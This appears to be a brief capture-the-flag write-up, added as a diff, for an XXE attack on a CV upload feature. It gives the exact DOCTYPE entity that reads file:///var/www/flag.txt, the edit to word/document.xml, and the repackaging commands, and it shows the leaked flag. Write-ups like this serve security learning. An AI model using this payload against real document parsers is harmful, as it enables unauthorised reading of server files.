@@ -1,0 +1,30 @@
+Create test.docx with content "test1"
+
+Upload it
+
+Show us
+	You CV content: test1
+
+unzip test.docx
+
+Edit word/document.xml
+	Add on line 2
+	```
+	<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///var/www/flag.txt'>]>
+	```
+
+	Edit line 3
+	```
+	...<w:t>test1</w:t>...
+	```
+	to
+	```
+	...<w:t>&xxe;</w:t>...
+	```
+
+Put the files in ./tmp/
+7z a malicious.zip ./tmp/*
+mv malicious.zip malicious.docx
+
+Upload
+	You CV content: flag{XML_is_ancestor_0f_every7hing_do_you_agree_?}
